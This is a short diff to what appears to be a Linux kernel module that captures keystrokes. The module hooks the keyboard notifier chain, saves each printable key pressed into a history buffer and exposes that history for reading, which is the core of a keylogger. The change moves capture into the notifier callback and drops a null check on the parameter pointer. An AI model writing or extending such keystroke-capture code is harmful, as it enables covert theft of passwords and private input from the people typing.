@@ -45,30 +45,19 @@ char *read_key_history(void)
 	return consumed_items;
 }
 
-irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
-{
-	struct keyboard_notifier_param *param = dev_id;
-
-	if (param && param->value) {
-		unsigned int keycode = param->value;
-
-		char key = (char)keycode;
-
-		save_key(key);
-	} else {
-		printk(KERN_ERR "Invalid keyboard interrupt parameters\n");
-	}
-
-	return IRQ_NONE;
-}
-
 int keyboard_notifier_callback(struct notifier_block *nblock,
 			       unsigned long code, void *_param)
 {
 	struct keyboard_notifier_param *param = _param;
 
-	if (code == KBD_KEYSYM && param && param->down) {
-		keyboard_interrupt_handler(0, param);
+	if (code == KBD_KEYSYM && param->down) {
+		char key = param->value;
+
+		if (key == 0x01) {
+			save_key(0x0a);
+		} else if (key >= 0x20 && key < 0x7f) {
+			save_key(key);
+		}
 	}
 
 	return NOTIFY_OK;
